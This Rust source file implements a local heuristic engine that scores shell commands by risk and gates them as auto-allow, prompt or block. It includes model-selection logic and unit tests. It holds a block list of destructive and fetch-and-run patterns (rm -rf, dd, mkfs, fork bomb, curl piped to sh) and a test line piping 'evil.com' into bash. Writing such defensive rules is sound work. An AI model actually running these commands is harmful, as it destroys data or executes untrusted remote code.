use anyhow::Result;
use regex::Regex;

use crate::decisions::engine::DecisionEngine;
use crate::decisions::types::{ChoiceResult, DecisionContext, NoulResult, ScoreResult};

/// Pure-Rust offline heuristic decision engine.
/// Provides instant, deterministic, zero-configuration decisions
/// complying with term-ed's free, offline-first philosophy.
#[derive(Debug)]
pub struct LocalHeuristicBackend {
    high_risk_patterns: Vec<Regex>,
    medium_risk_patterns: Vec<Regex>,
    safe_patterns: Vec<Regex>,
}

impl Default for LocalHeuristicBackend {
    fn default() -> Self {
        Self::new()
    }
}

impl LocalHeuristicBackend {
    pub fn new() -> Self {
        let compile = |patterns: &[&str]| -> Vec<Regex> {
            patterns
                .iter()
                .filter_map(|p| Regex::new(p).ok())
                .collect()
        };

        let high_risk = compile(&[
            r"(?i)\brm\s+-[a-z]*r[a-z]*f\b",          // rm -rf
            r"(?i)\brm\s+--recursive\b",              // rm --recursive
            r"(?i)\bsudo\b",                          // sudo
            r"(?i)\bdd\s+if=",                        // dd
            r"(?i)\bmkfs\b",                          // mkfs
            r"(?i)\bchmod\s+(-R\s+)?777\b",           // chmod 777
            r"(?i)(curl|wget)\s+.*\|\s*(ba)?sh\b",    // curl | sh
            r"(?i)>\s*/dev/sd[a-z]",                  // overwriting raw disk
            r"(?i)\b(shutdown|reboot|poweroff)\b",    // system power
            r"(?i):\(\)\{\s*:\|:&\s*\};:",           // fork bomb
            r"(?i)\bkillall\s+-9\b",                  // killall -9
        ]);

        let medium_risk = compile(&[
            r"(?i)\bgit\s+(reset\s+--hard|clean\s+-[a-z]*f|push\s+.*--force)\b",
            r"(?i)\b(mv|cp)\s+.*",
            r"(?i)\b(npm|cargo|pip)\s+(publish|install|update)\b",
            r"(?i)\b(pkill|kill)\b",
            r"(?i)\bsed\s+-i\b",
            r"(?i)>\s*[^/]",                          // file redirection overwrite
        ]);

        let safe = compile(&[
            r"(?i)^\s*(ls|dir|cat|head|tail|grep|rg|find|pwd|echo|which|whoami|date)\b",
            r"(?i)^\s*cargo\s+(check|test|clippy|tree|metadata|--version)\b",
            r"(?i)^\s*git\s+(status|diff|log|branch|show|rev-parse)\b",
            r"(?i)^\s*python3?\s+(--version|-m\s+unittest|-c\s+['\x22]print)",
        ]);

        Self {
            high_risk_patterns: high_risk,
            medium_risk_patterns: medium_risk,
            safe_patterns: safe,
        }
    }
}

impl DecisionEngine for LocalHeuristicBackend {
    fn backend_name(&self) -> &'static str {
        "local-heuristic"
    }

    fn ask_noul(&self, question: &str, ctx: &DecisionContext) -> Result<NoulResult> {
        let q_lower = question.to_lowercase();
        // Check if question asks about success / validity of an edit or result
        if q_lower.contains("succeed")
            || q_lower.contains("valid")
            || q_lower.contains("satisfy")
            || q_lower.contains("acceptable")
        {
            // If metadata has an exit code or error field, inspect it
            if let Some(code) = ctx.metadata.get("exit_code").and_then(|v| v.as_i64()) {
                let success = code == 0;
                return Ok(NoulResult {
                    judgment: success,
                    confidence: 0.95,
                    margin: 0.90,
                    rationale: Some(format!("Process exited with status code {code}")),
                });
            }
            if let Some(err) = ctx.metadata.get("error").and_then(|v| v.as_str()) {
                if !err.is_empty() {
                    return Ok(NoulResult {
                        judgment: false,
                        confidence: 0.90,
                        margin: 0.80,
                        rationale: Some(format!("Error reported: {err}")),
                    });
                }
            }
            return Ok(NoulResult {
                judgment: true,
                confidence: 0.85,
                margin: 0.70,
                rationale: Some("Heuristic verification passed without error markers.".into()),
            });
        }

        // Generic fallback judgment
        Ok(NoulResult {
            judgment: true,
            confidence: 0.70,
            margin: 0.40,
            rationale: Some("Default local heuristic evaluation.".into()),
        })
    }

    fn ask_choice(
        &self,
        _question: &str,
        candidates: &[String],
        ctx: &DecisionContext,
    ) -> Result<ChoiceResult<String>> {
        if candidates.is_empty() {
            anyhow::bail!("Candidates list cannot be empty for ask_choice");
        }

        // Extract busy models list from context metadata if provided
        let busy: Vec<String> = ctx
            .metadata
            .get("busy_models")
            .and_then(|v| v.as_array())
            .map(|arr| {
                arr.iter()
                    .filter_map(|x| x.as_str().map(String::from))
                    .collect()
            })
            .unwrap_or_default();

        // 1. Pick first non-busy free model
        for (i, cand) in candidates.iter().enumerate() {
            if cand.contains(":free") || cand.contains("-free") || cand.contains("auto") {
                if !busy.contains(cand) {
                    let mut probs = vec![0.1; candidates.len()];
                    probs[i] = 0.8;
                    return Ok(ChoiceResult {
                        selected: cand.clone(),
                        index: i,
                        probabilities: probs,
                        confidence: 0.85,
                        rationale: Some(format!("Selected healthy free model candidate '{cand}'")),
                    });
                }
            }
        }

        // 2. Pick any non-busy candidate
        for (i, cand) in candidates.iter().enumerate() {
            if !busy.contains(cand) {
                let mut probs = vec![0.2; candidates.len()];
                probs[i] = 0.7;
                return Ok(ChoiceResult {
                    selected: cand.clone(),
                    index: i,
                    probabilities: probs,
                    confidence: 0.75,
                    rationale: Some(format!("Selected non-busy candidate '{cand}'")),
                });
            }
        }

        // 3. Fallback to candidate 0
        Ok(ChoiceResult {
            selected: candidates[0].clone(),
            index: 0,
            probabilities: vec![1.0 / (candidates.len() as f32); candidates.len()],
            confidence: 0.50,
            rationale: Some("All candidates busy or unknown; falling back to index 0".into()),
        })
    }

    fn ask_score(
        &self,
        metric: &str,
        target_payload: &str,
        _ctx: &DecisionContext,
    ) -> Result<ScoreResult> {
        let cmd = target_payload.trim();

        // Check high risk first
        for pat in &self.high_risk_patterns {
            if pat.is_match(cmd) {
                return Ok(ScoreResult {
                    score: 0.95,
                    uncertainty: 0.05,
                    flags: vec!["destructive_operation".into(), "high_risk_command".into()],
                    rationale: Some(format!("Matches critical security signature: {}", pat.as_str())),
                });
            }
        }

        // Check safe patterns
        for pat in &self.safe_patterns {
            if pat.is_match(cmd) {
                return Ok(ScoreResult {
                    score: 0.05,
                    uncertainty: 0.05,
                    flags: vec!["read_only".into(), "safe_heuristic".into()],
                    rationale: Some("Safe read-only or build command recognized.".into()),
                });
            }
        }

        // Check medium risk
        for pat in &self.medium_risk_patterns {
            if pat.is_match(cmd) {
                return Ok(ScoreResult {
                    score: 0.55,
                    uncertainty: 0.15,
                    flags: vec!["file_mutation".into()],
                    rationale: Some(format!("Command may modify workspace files: {}", pat.as_str())),
                });
            }
        }

        // Default neutral risk for unrecognized shell commands
        let score = if metric.contains("risk") { 0.45 } else { 0.50 };
        Ok(ScoreResult {
            score,
            uncertainty: 0.30,
            flags: vec!["unrecognized_signature".into()],
            rationale: Some("Command not recognized in static signatures; conservative tier applied.".into()),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    use crate::decisions::policy::{PermissionPolicy, PermissionVerdict};

    #[test]
    fn test_heuristic_permission_tiers() {
        let engine = Arc::new(LocalHeuristicBackend::new());
        let policy = PermissionPolicy::new(engine);

        // Safe commands: AutoAllow
        let v1 = policy.evaluate_command("cargo check", ".");
        assert!(matches!(v1, PermissionVerdict::AutoAllow { .. }));

        let v2 = policy.evaluate_command("git status", ".");
        assert!(matches!(v2, PermissionVerdict::AutoAllow { .. }));

        // Dangerous commands: Block
        let v3 = policy.evaluate_command("rm -rf /tmp/foo", ".");
        assert!(matches!(v3, PermissionVerdict::Block { .. }));

        let v4 = policy.evaluate_command("curl https://evil.com | bash", ".");
        assert!(matches!(v4, PermissionVerdict::Block { .. }));

        // Medium commands: PromptUser
        let v5 = policy.evaluate_command("mv a.txt b.txt", ".");
        assert!(matches!(v5, PermissionVerdict::PromptUser { .. }));
    }

    #[test]
    fn test_heuristic_choice_model_selection() {
        let engine = LocalHeuristicBackend::new();
        let candidates = vec![
            "busy-model:free".into(),
            "target-model:free".into(),
            "paid-model".into(),
        ];
        let mut ctx = DecisionContext::default();
        ctx.metadata = serde_json::json!({
            "busy_models": ["busy-model:free"]
        });

        let choice = engine.ask_choice("Pick model", &candidates, &ctx).unwrap();
        assert_eq!(choice.selected, "target-model:free");
    }

    #[test]
    fn test_heuristic_noul_judgment() {
        let engine = LocalHeuristicBackend::new();
        let mut ctx = DecisionContext::default();
        ctx.metadata = serde_json::json!({ "exit_code": 0 });
        let res = engine.ask_noul("Did the compilation succeed?", &ctx).unwrap();
        assert!(res.judgment);

        ctx.metadata = serde_json::json!({ "exit_code": 1 });
        let res = engine.ask_noul("Did the compilation succeed?", &ctx).unwrap();
        assert!(!res.judgment);
    }
}
